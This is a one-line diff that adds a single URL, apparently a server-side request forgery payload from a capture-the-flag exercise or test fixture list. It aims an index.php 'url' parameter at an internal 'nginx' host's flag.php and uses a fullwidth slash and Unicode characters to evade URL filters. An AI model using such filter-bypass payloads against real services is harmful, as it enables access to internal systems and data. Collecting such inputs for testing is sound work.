@@ -1,0 +1,1 @@
+http://ホスト名/index.php?url=http://nginx／flag.php⁈.jp
